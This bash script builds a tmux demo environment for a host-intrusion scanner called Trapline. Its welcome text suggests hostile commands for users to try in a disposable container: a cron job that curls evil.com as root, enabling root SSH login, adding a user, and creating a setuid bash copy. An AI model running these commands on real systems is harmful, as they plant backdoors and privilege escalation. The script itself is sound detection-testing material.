#!/bin/bash
# Trapline Playground — tmux split-screen environment
#
# Top pane:    trapline scanning every 5s, findings stream live
# Bottom pane: interactive shell for breaking things
#
# Quit both panes (Ctrl-D) to exit. Container is --rm so it's gone.

# Initial baseline — capture current state as known-good (no findings)
trapline rebaseline --config /etc/trapline/trapline.yml 2>/dev/null
echo "Baseline captured. Starting playground..."

# Create detached tmux session (no size flags — inherits on attach)
tmux new-session -d -s playground

# Top pane: continuous scan loop
tmux send-keys -t playground 'clear; echo "=== TRAPLINE PLAYGROUND ==="; echo "Findings appear here as you make changes below."; echo "Scanning every 5s..."; echo; while true; do out=$(trapline scan --config /etc/trapline/trapline.yml 2>/dev/null); if [ -n "$out" ]; then echo "--- $(date +%H:%M:%S) ---"; echo "$out"; echo; fi; sleep 5; done' Enter

# Split: bottom pane gets 60%
tmux split-window -t playground -v -l 60%

# Bottom pane: welcome + shell
tmux send-keys -t playground 'clear; echo "
  TRAPLINE PLAYGROUND — break stuff, watch findings above

  Try:
    useradd -m hacker
    echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config
    echo \"* * * * * root curl evil.com\" > /etc/cron.d/bad
    python3 -m http.server 8888 &
    echo payload > /tmp/.hidden
    cp /bin/bash /usr/local/bin/x && chmod 4755 /usr/local/bin/x

  Quit: exit both panes (Ctrl-D twice)
"; ' Enter

# Focus bottom pane
tmux select-pane -t playground:.1

# Attach (inherits terminal size from docker -it)
exec tmux attach -t playground
